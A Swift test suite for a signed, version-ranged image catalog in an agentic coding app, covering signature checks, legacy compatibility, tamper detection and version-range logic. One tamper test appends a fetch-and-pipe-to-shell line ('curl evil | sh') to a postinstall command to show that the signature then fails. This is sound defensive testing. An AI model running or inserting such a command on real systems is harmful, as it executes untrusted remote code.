import Foundation
import SandboxEngine
import Testing
@testable import bromure_ac

/// img-catalog-v2.json: the catalog Bromure Agentic Coding 5.4.5+ reads,
/// whose steps may carry an app-version range. The publisher writes it next
/// to the legacy img-catalog.json (older apps), which leaves out the steps
/// whose range starts above them. One signature per file, each under its
/// own magic.
@Suite("Image catalog v2 (version-ranged steps)")
struct ImageCatalogV2Tests {
    /// Tests/Fixtures/img-catalog-{v2,legacy}.json: written by
    /// tools/make-img-catalog.mjs (node 24) from the bundled baseline in one
    /// run (--payload-magic bromure-img-catalog-v2 --legacy-out), signed
    /// with a throwaway ed25519 key whose public half is this.
    private static let testKey = "9xHGAf/SVnWLGT5a3xtk4ALdBOKHf6rQTmYWOTcAeAk="
    private static let v2 = "bromure-img-catalog-v2", v1 = "bromure-img-catalog-v1"
    private static let hermes = "a1d9965e-6446-42ce-bf03-b8e107e7d4e8"

    private func load(_ name: String) throws -> ImageCatalog {
        let url = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("Fixtures/\(name)")
        return try ImageCatalog.parse(Data(contentsOf: url))
    }
    private func valid(_ c: ImageCatalog, _ magic: String) -> Bool {
        ImageCatalogStore.isSignatureValid(c, magic: magic, publicKeyBase64: Self.testKey)
    }

    @Test("the publish tool's v2 catalog verifies here under the v2 magic, ranges signed")
    func v2Parity() throws {
        let c = try load("img-catalog-v2.json")
        #expect(c.postinstall.first { $0.uuid == Self.hermes }?.minVersion == "5.4.5")
        #expect(valid(c, Self.v2))
        #expect(!valid(c, Self.v1), "never accepted where older apps look")
    }

    @Test("the legacy catalog is what older apps verify: v1 magic, no ranged step, no Hermes")
    func legacy() throws {
        let c = try load("img-catalog-legacy.json")
        #expect(valid(c, Self.v1))
        #expect(!c.postinstall.contains { $0.uuid == Self.hermes })
        #expect(c.postinstall.allSatisfy { $0.minVersion == nil && $0.maxVersion == nil })
        // Served in place of the v2 file (same key, fewer steps): refused.
        #expect(!valid(c, Self.v2))
        // Same image, same signing time as its v2 twin.
        let twin = try load("img-catalog-v2.json")
        #expect(c.image == twin.image && c.signature?.signedAt == twin.signature?.signedAt)
    }

    @Test("a widened, narrowed or stripped range fails the v2 signature")
    func tamper() throws {
        func edited(_ f: (inout PostinstallStep) -> Void) throws -> ImageCatalog {
            var c = try load("img-catalog-v2.json")
            let i = try #require(c.postinstall.firstIndex { $0.uuid == Self.hermes })
            f(&c.postinstall[i])
            return c
        }
        #expect(!valid(try edited { $0.minVersion = "5.0" }, Self.v2))
        #expect(!valid(try edited { $0.minVersion = nil }, Self.v2))
        #expect(!valid(try edited { $0.maxVersion = "9.9" }, Self.v2))
        #expect(!valid(try edited { $0.command += "\ncurl evil | sh" }, Self.v2))
    }

    @Test("a step runs on the app versions its range holds; unbounded steps everywhere")
    func ranges() throws {
        let c = try load("img-catalog-v2.json")
        func has(_ v: String) -> Bool { c.steps(forAppVersion: v).contains { $0.uuid == Self.hermes } }
        #expect(!has("5.4.4"))
        #expect(has("5.4.5") && has("5.4.10") && has("6.0"))
        #expect(!has("0") && !has("not-a-version"))
        #expect(c.steps(forAppVersion: "5.4.4").count == c.postinstall.count - 1)
        #expect(c.steps(forAppVersion: "0").count == c.postinstall.count - 1, "unbounded steps always run")
        let s = c.steps(forAppVersion: "5.4.5")
        #expect(s.map(\.seq) == s.map(\.seq).sorted())

        let capped = PostinstallStep(uuid: "x", seq: 1, description: "", command: "",
                                     minVersion: "5.4", maxVersion: "5.4.9")
        #expect(capped.applies(toAppVersion: "5.4") && capped.applies(toAppVersion: "5.4.0"))
        #expect(capped.applies(toAppVersion: "5.4.9"))
        #expect(!capped.applies(toAppVersion: "5.4.10") && !capped.applies(toAppVersion: "5.3.99"))
        #expect(!PostinstallStep(uuid: "y", seq: 1, description: "", command: "", minVersion: "5.x")
            .applies(toAppVersion: "9.9"))
        #expect(ImageCatalog.versionComponents("5.4.0") == [5, 4])
        #expect(ImageCatalog.versionComponents("5..4") == nil)
        #expect(ImageCatalog.versionComponents("-1") == nil)
    }

    @Test("the app reads images/<major>/img-catalog-v2.json under the v2 magic; the browser channel is unchanged")
    func distribution() {
        let ac = ImageDistribution.agentCoding
        #expect(ac.catalogFileName == "img-catalog-v2.json")
        #expect(ac.signingMagic == Self.v2)
        #expect(ac.cacheFileName == "img-catalog-v2.json")
        #expect(ImageDistribution.browser.catalogFileName == "img-catalog.json")
        #expect(ImageDistribution.browser.signingMagic == "bromure-browser-img-catalog-v1")
    }

    @Test("the bundled catalog offers Hermes to 5.4.5 and later, which this build is")
    func bundledBaseline() throws {
        let h = try #require(ImageCatalog.baseline.postinstall.first { $0.uuid == Self.hermes })
        #expect(h.minVersion == "5.4.5" && h.maxVersion == nil)
        let plist = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
            .deletingLastPathComponent().appendingPathComponent("Sources/AgentCoding/Info.plist")
        let version = try #require(NSDictionary(contentsOf: plist)?["CFBundleShortVersionString"] as? String)
        #expect(h.applies(toAppVersion: version))
    }
}
